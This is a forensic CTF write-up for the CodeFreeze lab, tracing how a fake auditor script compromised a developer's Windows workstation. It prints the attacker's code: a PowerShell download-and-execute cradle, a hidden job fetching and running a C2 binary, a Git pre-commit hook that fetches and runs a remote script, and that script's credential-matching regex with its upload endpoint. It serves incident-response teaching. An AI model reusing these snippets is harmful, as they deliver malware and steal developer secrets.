# CodeFreeze Lab

<p align="center">
  <img src="image.png" alt="image.png">
</p>

# Table of Contents
- [Context](#context)
- [Scenario](#scenario)
- [Initial Access](#initial-access)
- [Execution](#execution)
- [Discovery](#discovery)
- [Privilege Escalation](#privilege-escalation)
- [Persistence](#persistence)
  * [Git Hook Abuse or Persistence](#git-hook-abuse-or-persistence)
- [Collection](#collection)
- [Exfiltration](#exfiltration)
- [Attack Chain](#attack-chain)
  * [Text Tree](#text-tree)
- [Artifacts](#artifacts)
- [Lab Insights](#lab-insights)
- [Forensic Timeline](#forensic-timeline)

# Context

Lab link: [https://cyberdefenders.org/blueteam-ctf-challenges/codefreeze/](https://cyberdefenders.org/blueteam-ctf-challenges/codefreeze/)

Suggested tools: Event Viewer, CyberChef, Registry Explorer, Timeline Explorer, PECmd, DB Browser for SQLite

Tactics: Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion

# Scenario

Caspery, a senior developer working remotely for Wowza Enterprise, reported that his `git commit` commands were taking unusually long to complete.

Several days later, the Threat Intelligence team discovered Caspery's credentials and API keys leaked on a dark web forum. The data included sensitive information from Wowza's internal systems.

The Incident Response plan was immediately activated. A forensic team was dispatched to acquire an image of Caspery's workstation. Your mission is to conduct an analysis on the forensic image to identify the root cause of the breach. Time is critical - the data is already compromised and actively being traded on dark web marketplaces.

# Initial Access

**Q1**- The user suspected that the suspicious activity occurred after executing an "audit" script provided by an individual claiming to be an auditor during a meeting. Identify the meeting ID associated with the threat actor.

Answer: `vqe-xhmi-jtn`

Reason: Caspery's browser history became the focus of the investigation after the lead identified a fraudulent auditor meeting as the suspected entry vector. A review of `Microsoft Edge`'s default profile database returned no relevant artifacts, prompting a pivot to `Zen`, a Firefox based browser fork installed under the user's profile. We opened the `places.sqlite` database in `DB Browser for SQLite` in read-only mode to preserve the integrity of the evidence file. The `moz_places` table contained a visited `Google Meet` uniform resource locator (URL) that ties the threat actor's meeting directly to the user's session, supporting initial access via a fraudulent video conferencing pretext. This visit happened at `1769000513237000` which is in PRTime, Mozilla's internal timestamp format (microseconds since 1970-01-01 UTC), used throughout Firefox-based browsers including Zen — different from Chromium's WebKit time format and from Windows FILETIME. Exact time is: `2026-01-21 13:01:53`.

![image.png](image%201.png)

**Q2**- During the meeting, the threat actor provided the victim with a malicious command disguised as an "audit" script intended to assess the developer environment. From the full URL hosting the actual script identify the GitHub username hosting the script and the script's filename

Answer: `ChickenLoner`, `Dev-Workstation-Assessment.ps1`

Reason: With no script uniform resource locator (URL) appearing in the browser history, the investigation pivoted to PowerShell's `ConsoleHost_history.txt`, which preserves every command typed into a session regardless of whether the window was later closed. There, a `powershell.exe` invocation using the `-ExecutionPolicy Bypass` and `-EncodedCommand` flags stood out as an obvious obfuscation attempt. Decoding the Base64 blob revealed an Invoke-Expression (`IEX`) one-liner using `(New-Object Net.WebClient).DownloadString()` to fetch and execute a raw script directly from a GitHub Gist, exposing both the threat actor's GitHub username and the malicious script's filename.

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/ChickenLoner/486137f8a96668b4e9778ce43458fd2e/raw/4402acda06f89254c4fee1e8bb8a5cef6401745f/Dev-Workstation-Assessment.ps1')
```

![image.png](image%202.png)

![image.png](image%203.png)

# Execution

**Q3**- Upon inspection of the fake assessment script, an additional C2 URL was identified hosting a malicious binary that was ultimately executed on the system. What is the full URL of this C2 endpoint?

Answer: `http://speecltest.xyz/cf.exe`

Reason: The script retrieved directly from the Gist URL identified in the prior step, rather than continued hunting for execution artifacts, contained a hidden `Start-Job` background block. This block downloaded a second-stage binary from a command and control (C2) endpoint using a spoofed `WindowsCompliance` User-Agent string, saved the binary to the user's temp directory as `6.exe`, marked the file hidden via its file attributes, and launched it with a hidden window to evade casual detection.

```bash
$ curl -O https://gist.githubusercontent.com/ChickenLoner/486137f8a96668b4e9778ce43458fd2e/raw/4402acda06f89254c4fee1e8bb8a5cef6401745f/Dev-Workstation-Assessment.ps1
% Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   7043 100   7043   0      0  20799      0                              0
```

```powershell
<SNIP>
Start-Job -ScriptBlock {
    try {
        $url = "hxxp://speecltest.xyz/cf.exe"
        $target = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "6.exe")
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsCompliance/2.3")
        $wc.DownloadFile($url, $target)
        $f = Get-Item $target -Force; $f.Attributes = "Hidden"
        Start-Process $target -WindowStyle Hidden
    } catch {}
} | Out-Null
<SNIP>                                                                                  
```

**Q4**- A previous version of the script reveals another C2 address that was used to test the payload. What domain was identified in that earlier version?

Answer: `security-compliance.internal.corp`

Reason: The Gist's revision history, a GitHub feature that preserves every edited version of a public Gist, surfaced a `December 24, 2025` revision diff. The diff showed the threat actor swapping an earlier C2 domain for the live domain used in the final attack, alongside cosmetic changes that disguised the payload module's console output as an innocuous `speedtest` label rather than the original `compliance verification` labeling. This labeling change serves as an additional signal that the threat actor iterated on the lure's plausibility over time.

Reference: `hxxps://gist.github.com/ChickenLoner/486137f8a96668b4e9778ce43458fd2e/revisions`

![image.png](image%204.png)

**Q5**- Upon execution, the script downloads a binary file and runs it on the system. Identify the full path of the downloaded binary.

Answer: `C:\Users\caspery\AppData\Local\Temp\6.exe`

Reason: The downloaded binary's full path was already implicit in the script logic reviewed previously. The `[System.IO.Path]::GetTempPath()` method resolves to the current user's temporary directory, which for a standard user session corresponds to `AppData\Local\Temp`. Combined with the hardcoded filename `6.exe`, this resolves to a drop path of `C:\Users\<username>\AppData\Local\Temp\6.exe`.

For reference so far, the related epoch values convert the same way (÷1,000,000 for seconds, or ÷1,000 then `FromUnixTimeMilliseconds` as above):

- 1769000513237000 → `2026-01-21 13:01:53 UTC` (Meet visit)
- 1769000720675000 → `2026-01-21 13:05:20 UTC` (compliance report opened)
- 1769003504497000 → `2026-01-21 13:51:44 UTC` (localhost IAM page)
- 1769003615193000 → `2026-01-21 13:53:35 UTC` (localhost admin dashboard)

# Discovery

**Q6**- During the enumeration phase, the threat actor enumerated security groups on the system, revealing a process that had been injected by a malicious executable. What is the name of this process and its process ID (PID in decimal)?

Answer: `notepad.exe`, `8220`

Reason: Anchoring back to the Q1 meeting timestamp (`2026-01-21 13:01:53 UTC`) revealed the real signal nine minutes later. Event ID `4799` (Security Group Management, Audit Success) recorded over a dozen security-group enumeration events firing at the identical timestamp `13:10:32 UTC`, all attributed to `notepad.exe`, a text editor with no legitimate reason to query Windows group membership, let alone in a single synchronized burst. This pattern is consistent with injected shellcode making rapid enumeration application programming interface (API) calls rather than normal user or script behavior.

![image.png](image%205.png)

**Q7**- Security group enumeration revealed that the compromised user belonged to a special privileged group that allows members to back up and restore all files on the system. What is the name of this security group?

Answer: `Backup Operators`

Reason: Among the security groups enumerated by the injected `notepad.exe` process within the same Event ID `4799` burst, `Backup Operators` stood out as immediately significant at `2026-01-21 13:10:32 UTC`. This built-in Windows privileged group grants its members the ability to back up and restore any file on the system regardless of standard NTFS permissions, including normally protected files such as the Security Account Manager (SAM) and `SYSTEM` registry hives. Confirmed membership in this group functions as a well-known privilege escalation primitive, since it enables an attacker to bypass file-level protections that would otherwise block direct access to credential material.

![image.png](image%206.png)

# Privilege Escalation

**Q8**- To prepare for privilege escalation, the threat actor uploaded a DLL file masquerading as a legitimate DLL used by a remote desktop application installed on the system. What is the name of this file, and when was it created?

Answer: `gcapl.dll`, `2026-01-21 13:14`

Reason: To prepare for privilege escalation, the threat actor staged a malicious dynamic-link library (DLL) disguised as a legitimate AnyDesk component, dropping `gcapl.dll` directly into the AnyDesk install directory at `.\ProgramData\AnyDesk` rather than its proper location. This setup allows the attacker's code to load under the guise of a trusted remote desktop process. The artifact was identified by parsing the Master File Table (MFT) with `MFTECmd` and filtering the resulting comma-separated values (CSV) output in `Timeline Explorer` on the AnyDesk parent path, which showed every other file in that folder as long-standing legitimate AnyDesk binaries except for this single anomalous entry, created on `2026-01-21 13:14:50`.

```powershell
PS C:\Users\Administrator\Desktop\Start Here\Tools\ZimmermanTools\net6> .\MFTECmd.exe -f "C:\Users\Administrator\Desktop\Start Here\Artifacts\CodeFreeze_Lab_Evidence\C\`$MFT" --csv 'C:\Users\Administrator\D
esktop\Start Here'
MFTECmd version 1.2.2.1

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/MFTECmd

Command line: -f C:\Users\Administrator\Desktop\Start Here\Artifacts\CodeFreeze_Lab_Evidence\C\$MFT --csv C:\Users\Administrator\Desktop\Start Here

File type: Mft

Processed C:\Users\Administrator\Desktop\Start Here\Artifacts\CodeFreeze_Lab_Evidence\C\$MFT in 5.2694 seconds

C:\Users\Administrator\Desktop\Start Here\Artifacts\CodeFreeze_Lab_Evidence\C\$MFT: FILE records found: 181,498 (Free records: 5,609) File size: 182.8MB
        CSV output will be saved to C:\Users\Administrator\Desktop\Start Here\20260625042732_MFTECmd_$MFT_Output.csv
```

![image.png](image%207.png)

![image.png](image%208.png)

**Q9**- The threat actor abused a special privilege to modify an existing service on the system to load the previously identified DLL. What is the name of this service?

Answer: `wisvc`

Reason: Sorting services in `Registry Explorer`'s `SYSTEM` hive by Name Key Last Write time surfaced `wisvc` (Windows Insider Service) as the standout entry. Its key was modified at `2026-01-21 13:15:02`, seconds after `gcapl.dll` was dropped. The service's `ServiceDll` value pointed directly to `C:\ProgramData\AnyDesk\gcapl.dll` instead of the legitimate `flightsettings.dll`. The service's Required Privileges list includes `SeImpersonatePrivilege` and `SeTcbPrivilege`, special privileges that let a process impersonate other security contexts, including `SYSTEM`. This is exactly the kind of privilege abuse needed to escalate from a lower-privileged foothold to full system control once the malicious DLL loads under this service.

![image.png](image%209.png)

**Q10**- The threat actor waited for a subsequent system reboot so the modified service could start and load the DLL. Determine the operating system startup time on the following day. What is the timestamp of this OS startup as recorded by the Kernel-General source?

Answer: `2026-01-22 11:36`

Reason: With `wisvc` hijacked and `gcapl.dll` staged on `2026-01-21`, the threat actor waited for the next reboot to trigger the malicious service load. That reboot occurred the following day, confirmed via Event ID `12` from `Microsoft-Windows-Kernel-General` in the System event log on host `InsaneDev10x`, recording OS startup at `2026-01-22 11:36:24 UTC`.

![image.png](image%2010.png)

**Q11**- The DLL also implements logging functionality. Provide the full path of the log file created after the DLL was loaded into the process.

Answer: `C:\Windows\Temp\wisvc_debug.log`

Reason: After the reboot triggered `wisvc` to load `gcapl.dll`, the malicious DLL wrote a debug log to `C:\Windows\Temp\wisvc_debug.log`, confirmed via Master File Table (MFT) entry created at `2026-01-22 11:38:11`. This is roughly two minutes after the `2026-01-22 11:36:24` OS startup recorded previously, a gap consistent with normal service initialization time following boot.

![image.png](image%2011.png)

# Persistence

**Q12**- After gaining high privileges, the threat actor created a service masquerading as a legitimate system monitoring tool that logs events such as process creation. What is the name of the service?

Answer: System Monitor

Reason: With SYSTEM privileges gained via the `wisvc`/`gcapl.dll` hijack, the threat actor installed a new service named `System Monitor` (internal service name `Sysmon`) at `2026-01-22 11:46:23`, masquerading as the legitimate Sysinternals Sysmon process monitoring tool. The masquerade is precise rather than approximate: `System Monitor` and `Sysmon` are the exact display name and internal service name pair used by the genuine Sysinternals tool, making this a deliberate replication rather than a loosely similar alias. Event ID `7045` from Service Control Manager confirmed the installation, and the registry corroborated it with a Name Key Last Write of `2026-01-22 11:50:02`. The binary was placed at `C:\Windows\Sysmon.exe`, running as `LocalSystem` on auto-start.

![image.png](image%2012.png)

![image.png](image%2013.png)

**Q13**- To make the service appear legitimate, the threat actor dropped a fake operational log file associated with the service from Q12. Provide the timestamp when this log file was created.

Answer: `2026-01-22 11:47`

Reason: Every other `.evtx` file in that folder is dated `1/26/2026`, the last day of the incident, but `Microsoft-Windows-Sysmon%4Operational.evtx` stands out at `1/22/2026 11:47 AM`, created one minute after the fake `System Monitor` service was installed at `11:46:23`. The attacker pre-seeded a fake Sysmon event log file to complete the illusion of legitimate monitoring tooling already running on the host. This reinforces the prior T1036.004, Masquerading: Masquerade Task or Service mapping, since the fabricated log file extends the masquerade from the service registration itself to the artifacts a defender would expect to find when verifying that a monitoring tool is genuine.

```powershell
-a----        1/26/2026   1:11 PM          69632 Microsoft-Windows-SMBServer%4Operational.evtx
-a----        1/26/2026   1:10 PM        1118208 Microsoft-Windows-StateRepository%4Operational.evtx
-a----        1/14/2026  12:16 PM          69632 Microsoft-Windows-Storage-ClassPnP%4Operational.evtx
-a----        1/26/2026   1:09 PM        1118208 Microsoft-Windows-Storage-Storport%4Health.evtx
-a----        1/26/2026   1:10 PM        1118208 Microsoft-Windows-Storage-Storport%4Operational.evtx
-a----        1/26/2026   1:10 PM          69632 Microsoft-Windows-StorageSpaces-Driver%4Operational.evtx
-a----        1/26/2026   1:11 PM       20058112 Microsoft-Windows-Store%4Operational.evtx
-a----        1/26/2026   1:12 PM          69632 Microsoft-Windows-Storsvc%4Diagnostic.evtx
-a----        1/22/2026  11:47 AM          69632 Microsoft-Windows-Sysmon%4Operational.evtx
-a----        1/26/2026   1:10 PM          69632 Microsoft-Windows-TaskScheduler%4Maintenance.evtx
-a----        1/26/2026   1:10 PM        1052672 Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx
-a----        1/26/2026   1:31 PM        1052672 Microsoft-Windows-Time-Service%4Operational.evtx
-a----        1/14/2026   1:51 PM          69632 Microsoft-Windows-TWinUI%4Operational.evtx
-a----        1/26/2026   1:31 PM          69632 Microsoft-Windows-TZSync%4Operational.evtx
-a----        1/26/2026   1:11 PM        1052672 Microsoft-Windows-UniversalTelemetryClient%4Operational.evtx
-a----        1/26/2026   1:13 PM          69632 Microsoft-Windows-User Device Registration%4Admin.evtx
-a----        1/26/2026   1:13 PM        1118208 Microsoft-Windows-User Profile Service%4Operational.evtx
```

![image.png](image%2014.png)

**Q14**- After identifying that the user was working on multiple projects and using Git for version control, the threat actor created a folder and dropped a file that executes before the user commits changes. What is the full path of this file?

Answer: `C:\ProgramData\.git-hooks\pre-commit`

Reason: Identifying the user's active Git workflow, the threat actor created `C:\ProgramData\.git-hooks\pre-commit` at `2026-01-22 12:50:22`, planting a malicious Git hook that executes automatically before every commit the user makes. This is a stealthy persistence mechanism that piggybacks on legitimate developer activity rather than relying on a scheduled task or service. The file had no extension and left no trace in the standard artifact folders, requiring a `$J` (Update Sequence Number, or USN, Journal) search by parent entry number to locate the `FileCreate` record, then pivoting to the Master File Table (MFT) to confirm the full parent path `.\ProgramData\.git-hooks`.

It is also worth flagging that placing the hook at `C:\ProgramData\.git-hooks\pre-commit` rather than inside the actual repository's `.git\hooks\` directory means the hook would only execute if the user's Git configuration explicitly points `core.hooksPath` to that external location; confirming whether that configuration change exists would strengthen the causal chain between this artifact and actual triggered execution.

![image.png](image%2015.png)

![image.png](image%2016.png)

## Git Hook Abuse or Persistence

Git hook abuse, or Git hook persistence, works because Git hooks are just local executable scripts that `git.exe` invokes automatically on lifecycle events like `pre-commit`, `post-checkout`, `post-merge`, and `pre-push`, with zero additional user action required beyond the normal commands a developer already runs dozens of times a day. The default location is `.git/hooks/` inside a repository, but `core.hooksPath` lets that default be overridden, either per-repo in `.git/config` or globally via `git config --global core.hooksPath <path>`. A global override is the more dangerous variant, since it silently redirects hook execution for every repository on the host to a single attacker-controlled directory, rather than requiring the attacker to compromise each repo individually.

What makes this an effective persistence primitive is less about stealth in any single artifact and more about which checklists it falls outside of. Most persistence hunting is built around three buckets: scheduled tasks, services, and registry run keys. A Git hook is none of those, so it simply doesn't appear on the radar of tooling tuned to those categories. It also rides on a trigger that's both frequent and entirely legitimate-looking from the user's perspective, since nothing about running `git commit` or `git checkout` looks suspicious to the user experiencing it. Hook files commonly carry no extension and can live anywhere on disk once `core.hooksPath` is repointed, which is exactly why filesystem hunting alone tends to miss it; the case here only surfaced it through a `$J` (USN Journal) search by parent entry number, not through any standard artifact folder review.

Detection is best anchored on process lineage rather than file location. Since a hook is ultimately just a shell, batch, or PowerShell script that Git's internal hook-execution logic spawns, EDR telemetry showing `git.exe` as the parent of `cmd.exe`, `powershell.exe`, `sh`, or `bash` during commit, checkout, or merge activity is a durable signal that doesn't depend on knowing where the hook physically lives. The complementary, fully deterministic check is auditing `core.hooksPath` values, both per-repo and global, for anything other than the default empty value or `.git/hooks`; any non-default value is worth treating as a finding on its own.

On MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK) placement, this sits under T1546, Event Triggered Execution, as the parent technique, with the Git hook acting as the trigger condition. No current sub-technique names Git hooks specifically, so T1546 itself is the closest fit rather than a more granular T1546.00x entry, consistent with the earlier flag on this case.

# Collection

**Q15**- The contents of the previously identified file reveal another script used for data exfiltration. From the full URL hosting this script identify the GitHub username hosting the script and the script's filename.

Answer: `ChickenLoner`, `secret.sh`

Reason: The pre-commit hook's `384`-byte resident MFT content revealed a shell script that silently fetches and executes a remote payload from a GitHub Gist on every commit. The hosting GitHub username is `ChickenLoner` and the script filename is `secret.sh`, downloaded to `/tmp/s.sh`, executed, then deleted to leave no local trace.

Worth flagging for precision: this is more accurately described as a download-execute-delete pattern with anti-forensic cleanup rather than in-memory execution. In-memory execution (fileless execution) specifically refers to techniques where the payload never touches disk at all, such as reflective loading directly into process memory. Here, `secret.sh` is briefly written to `/tmp/s.sh` before being deleted, so a disk artifact does exist for a window of time, just not one that survives the script's own self-cleanup. That distinction matters for the write-up, since it changes where recoverability would come from: not memory forensics, but disk-level artifacts like file system journal entries, `$J` (USN Journal) records, or cached/prefetch data, depending on the host platform.

```powershell
PS C:\Users\Administrator\Desktop\Start Here\Artifacts\Resident> .\MFTECmd.exe --dr -f 'C:\Users\Administrator\Desktop\Start Here\Artifacts\CodeFreeze_Lab_Evidence\C\$MFT' --csv 'C:\Users\Administrator\Desk
top\Start Here\Artifacts'

PS C:\Users\Administrator\Desktop\Start Here\Artifacts\Resident> ls *pre-commit*
    Directory: C:\Users\Administrator\Desktop\Start Here\Artifacts\Resident
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/25/2026   6:23 PM            384 34852-13_pre-commit.bin
```

```bash
#!/bin/sh

URL="https://gist.githubusercontent.com/ChickenLoner/d59b614c1e9ed09edf98500e36ab4361/raw/0089171764910b267711cc17eda5b4d3e947d1e0/secret.sh"
TEMP_SCANNER="/tmp/s.sh"

# fetch the remote script quietly, run it only if download succeeded, then delete it. If anything fails, the hook exits 1 (blocking the commit) but leaves no trace of what it tried to do
if curl -f -s -o "$TEMP_SCANNER" "$URL"; then
  
    sh "$TEMP_SCANNER"
    EXIT_CODE=$?
    
    rm "$TEMP_SCANNER"
    
    if [ $EXIT_CODE -ne 0 ]; then
        exit 1
    fi
else
    exit 1
fi
exit 0
```

**Q16**- The script uses a specific pattern to identify sensitive data within Git history and the current commit. What is the full pattern?

Answer: `password|api[*-]?key|secret|token|aws[*-]?access|private[_-]?key|BEGIN.*PRIVATE.*KEY|DB_PASSWORD|POSTGRES|MYSQL_PASSWORD`

Reason: The `secret.sh` script used `grep -iE` with a regular expression (regex) pattern targeting common credential and secret naming conventions across tracked Git files and commit history. This design harvests credentials before they leave the developer's machine, executing on every commit rather than as a one-time scan. This maps to MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK) T1552.001, Unsecured Credentials: Credentials In Files, for the regex-based harvesting of hardcoded secrets, and T1119, Automated Collection, since the search runs automatically on each commit rather than requiring manual operator action.

```bash
$ curl -O https://gist.githubusercontent.com/ChickenLoner/d59b614c1e9ed09edf98500e36ab4361/raw/0089171764910b267711cc17eda5b4d3e947d1e0/secret.sh
$ grep -i password secret.sh -C 2 
                              
                matches=$(echo "$staged_content" | grep -iE "password|api[_-]?key|secret|token|aws[_-]?access|private[_-]?key|BEGIN.*PRIVATE.*KEY|DB_PASSWORD|POSTGRES|MYSQL_PASSWORD" 2>/dev/null | head -20)
                
                if [ -n "$matches" ]; then
--
            if [ -f "$file" ]; then
                
                matches=$(grep -iE "password|api[_-]?key|secret|token|aws[_-]?access|private[_-]?key|BEGIN.*PRIVATE.*KEY|DB_PASSWORD|POSTGRES|MYSQL_PASSWORD" "$file" 2>/dev/null | head -5)
                
                if [ -n "$matches" ]; then
```

**Q17**- The script creates a marker file to determine whether it has previously executed on the system. What is the name of this file?

Answer: `.git-scanner-init`

Reason: The `secret.sh` script checks for a marker file at `$USERPROFILE\.git-scanner-init` on Windows or `$HOME/.git-scanner-init` on Unix on each execution to determine whether it has already run an initial scan. If the marker file exists, the script skips re-initialization and proceeds directly to exfiltration; its absence triggers the full first-run setup. Checking both Windows and Unix environment variables in a single shell script is consistent with the hook's execution context here, since Git for Windows runs hooks through a bundled `sh.exe` interpreter (MinGW/MSYS), which is why a script written for `/bin/sh` syntax can still reference a Windows-style path.

```bash
$ head secret.sh 
#!/bin/sh

if [ -n "$USERPROFILE" ]; then
    MARKER_FILE="$USERPROFILE/.git-scanner-init"
else
    MARKER_FILE="$HOME/.git-scanner-init"
fi
```

# Exfiltration

**Q18**- What is the full URL where the exfiltrated data is uploaded?

Answer: `hxxp://speecltest.xyz/upload`

Reason: The `secret.sh` script constructs the exfiltration uniform resource locator (URL) by appending `/upload` to a base URL, which is hardcoded as `hxxp://speecltest[.]xyz` as the fallback used when no `$URL` environment variable is set. All harvested credential matches are `POST`ed to this endpoint. This maps to MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK) T1041, Exfiltration Over C2 Channel, since the harvested credentials leave the host over the same HTTP channel used for payload retrieval rather than a separate exfiltration-specific protocol, and T1568, Dynamic Resolution, given the `$URL` environment variable fallback design, which lets the threat actor repoint the exfiltration endpoint without modifying the script itself.

```bash
$ cat secret.sh                       
#!/bin/sh

if [ -n "$USERPROFILE" ]; then
    MARKER_FILE="$USERPROFILE/.git-scanner-init"
else
    MARKER_FILE="$HOME/.git-scanner-init"
fi

if [ -z "$URL" ]; then
    URL="http://speecltest.xyz"
fi

EXFIL_URL="${URL}/upload"
```

**Q19**- The pre-commit hook downloads a temporary script to the system each time a Git commit is made. Using filesystem artifacts, how many times was this temporary script downloaded? And when was it first executed?

Answer: 3, `2026-01-22 13:10`

Reason: Searching the Update Sequence Number (USN) Journal (`$J`) for `s.sh` by filename revealed `3` `FileCreate` events across the incident timeline, confirming the pre-commit hook fired three times, corresponding to three Git commits made by the user. The first execution is anchored to `2026-01-22 13:10:43`, when the first `FileCreate` and `DataExtend` sequence appears, followed by `FileDelete`|`Close` at `13:10:53`. The full download-execute-delete cycle completes in `10` seconds and leaves no file on disk, exactly as designed.

![image.png](image%2017.png)

**Q20**- What is the commit hash of the first commit that caused the script to execute?

Answer: `70c08d68cbec8c04ff967616f306e22a21e9aba0`

Reason: Standard `git log` commands failed entirely against the forensic artifact copy. Git refused to recognize the `.git` folder regardless of the `--git-dir` flag, the `$env:GIT_DIR` environment variable, the `safe.directory` configuration setting, or a `subst` drive mapping, likely due to a missing `HEAD` file in the collected artifact. Manually writing `ref: refs/heads/master` into `.git\HEAD` did not resolve the issue either.

The solution came from reading `.git\logs\HEAD` directly as plaintext, which stores the full `reflog` in human-readable format with Unix epoch timestamps indicating the before and after hashes. Converting those timestamps to UTC and cross-referencing against the first `sh.exe` execution time of `2026-01-22 13:10:43 UTC`, recorded in both the USN Journal (`$J`) and Prefetch (`SH.EXE-8E5C1208.pf`), narrowed the search to a single candidate. The commit timestamped `1769087439` (`13:10:39 UTC`, four seconds before the hook fired) matched exactly, identifying commit `70c08d68cbec8c04ff967616f306e22a21e9aba0` ("`delete logs`") as the first commit that triggered the `pre-commit` hook to download and execute `secret.sh`.

```powershell
# Read relevant HEAD commit history file
PS C:\Users\Administrator\Desktop\Start Here\Artifacts\CodeFreeze_Lab_Evidence\C\Users\caspery\wowza\wowweb\webpage\.git\logs> cat .\HEAD
0000000000000000000000000000000000000000 401912625bace058b2c96ac60cde7ca43e1ea083 Caspery Punk <caspery@InsaneDev10x.wowza> 1768285484 +0700    commit (initial): initial
401912625bace058b2c96ac60cde7ca43e1ea083 17cc1b315dc24ae51bd2736fd398d123ba83c19a Caspery Punk <caspery@InsaneDev10x.wowza> 1768286774 +0700    commit: Webapp v1
17cc1b315dc24ae51bd2736fd398d123ba83c19a 5a5b50c40bb5ea13ece2deb4091424896dc57213 Caspery Punk <caspery@InsaneDev10x.wowza> 1769002660 +0700    commit: Add admin page v0.1
5a5b50c40bb5ea13ece2deb4091424896dc57213 b28261c6cc8b59c6d1410bcba777a1403057b161 Caspery Punk <caspery@InsaneDev10x.wowza> 1769004330 +0700    commit: Admin page v0.2
b28261c6cc8b59c6d1410bcba777a1403057b161 569a1878e207316ccf767def5944e17038ae6659 Caspery Punk <caspery@InsaneDev10x.wowza> 1769086502 +0700    commit: add more logs
569a1878e207316ccf767def5944e17038ae6659 2943a98077390f489cc10b7020fd6b3d206e2ea0 Caspery Punk <caspery@InsaneDev10x.wowza> 1769087192 +0700    commit: add bruteforce prevention
2943a98077390f489cc10b7020fd6b3d206e2ea0 70c08d68cbec8c04ff967616f306e22a21e9aba0 Caspery Punk <caspery@InsaneDev10x.wowza> 1769087439 +0700    commit: delete logs
70c08d68cbec8c04ff967616f306e22a21e9aba0 78999f3d4fb5131b335d31a86eb633eb7147bcc9 Caspery Punk <caspery@InsaneDev10x.wowza> 1769087788 +0700    commit: add gitignore
78999f3d4fb5131b335d31a86eb633eb7147bcc9 082f2abb12ab10308ffc1064f51f3d11409e5413 Caspery Punk <caspery@InsaneDev10x.wowza> 1769088799 +0700    commit: Task scheduler friendly
```

```python
# Quick pytho script to convert from Unix epoch timestamps to UTC
from datetime import datetime, timezone, timedelta
tz = timezone(timedelta(hours=7))
commits = [1769086502, 1769087192, 1769087439, 1769087788, 1769088799]
for ts in commits:
    dt_local = datetime.fromtimestamp(ts, tz=tz)
    dt_utc = datetime.fromtimestamp(ts, tz=timezone.utc)
    print(ts, dt_local.strftime('%H:%M:%S +0700'), dt_utc.strftime('%H:%M:%S UTC'))

1769086502 19:55:02 +0700 12:55:02 UTC
1769087192 20:06:32 +0700 13:06:32 UTC
1769087439 20:10:39 +0700 13:10:39 UTC <- # exact timestamp as first run of the s.sh script
1769087788 20:16:28 +0700 13:16:28 UTC
1769088799 20:33:19 +0700 13:33:19 UTC
```

**Q21**- To enable execution of the planted script, the threat actor modified Git's global config. When did this modification occur?

Answer: `2026-01-22 13:07`

Reason: Identifying that the victim user `caspery` used Git for Windows, the threat actor modified the installation-level Git configuration at `C:\Users\caspery\AppData\Local\Programs\Git\etc\gitconfig` at `2026-01-22 13:07:24`, adding `core.hooksPath = C:\ProgramData\.git-hooks`. This redirected all of `caspery`'s Git hook lookups to the attacker-controlled directory containing the malicious `pre-commit` file.

This installation-level change is distinct from two other configuration files: `caspery`'s personal `~\.gitconfig`, which contained only editor and user identity settings and was never modified, and the `SYSTEM` account's `.gitconfig`, modified earlier at `12:44:36` with the same `hooksPath` value to cover Git operations running under the `SYSTEM` context via `wisvc`. Setting `hooksPath` in two separate configuration files indicates a belt-and-suspenders approach, ensuring the hook fires regardless of which execution context runs Git. The installation-level config was the decisive one for `caspery`'s interactive commits, confirmed by the `13:07:24` timestamp falling between the hook drop at `12:50:22` and the first execution at `13:10:39`. All three files were identified via Master File Table (MFT) resident data extraction, since the files were either absent from the artifact folder or their content was only recoverable from the MFT itself as one of the resident files.

```powershell
# Installation-level config (decisive for caspery's interactive commits)
C:\Users\caspery\AppData\Local\Programs\Git\etc\gitconfig
  modified: 2026-01-22 13:07:24
  core.hooksPath = C:\ProgramData\.git-hooks

# SYSTEM account config (covers git operations under SYSTEM via wisvc)
<SYSTEM profile>\.gitconfig
  modified: 2026-01-22 12:44:36
  core.hooksPath = C:\ProgramData\.git-hooks

# Untouched for comparison
C:\Users\caspery\.gitconfig
  editor/user settings only, no modification
```

# Attack Chain

| Time (UTC) | Stage | Detail | MITRE |
| --- | --- | --- | --- |
| `2026-01-21 13:14:50` | Initial Access | Threat actor dropped `gcapl.dll` (`183,296` bytes) into `C:\ProgramData\AnyDesk\`, masquerading as a legitimate AnyDesk component | `T1574.001` |
| `2026-01-21 13:15:02` | Privilege Escalation | `wisvc` (Windows Insider Service) `ServiceDll` registry value modified to point to `C:\ProgramData\AnyDesk\gcapl.dll`, hijacking the service to load the malicious DLL under SYSTEM context | `T1574.005` |
| `2026-01-22 11:36:24` | Execution | System rebooted; OS startup recorded by `Microsoft-Windows-Kernel-General` Event ID `12` at `2026-01-22T11:36:24.500000000Z` on host `InsaneDev10x` | `T1529` |
| `2026-01-22 11:38:11` | Execution | `wisvc` loaded `gcapl.dll` into `svchost.exe` process space; DLL wrote debug log to `C:\Windows\Temp\wisvc_debug.log` | `T1574.005` |
| `2026-01-22 11:46:23` | Persistence | Fake `System Monitor` service (`Sysmon`) installed via Event ID `7045`, binary placed at `C:\Windows\Sysmon.exe`, auto-start as `LocalSystem`, masquerading as legitimate Sysinternals Sysmon | `T1543.003` |
| `2026-01-22 11:47:39` | Defense Evasion | Fake `Microsoft-Windows-Sysmon%4Operational.evtx` dropped into `C:\Windows\System32\winevt\Logs\` to complete the Sysmon legitimacy illusion | `T1562.002` |
| `2026-01-22 12:44:36` | Persistence | SYSTEM account's `.gitconfig` (`C:\Windows\System32\config\systemprofile\.gitconfig`) modified to set `core.hooksPath = C:\ProgramData\.git-hooks` | `T1574.004` |
| `2026-01-22 12:50:22` | Persistence | Attacker-controlled `pre-commit` hook dropped into `C:\ProgramData\.git-hooks\`, configured to download and execute `secret.sh` from GitHub Gist on every git commit | `T1546.004` |
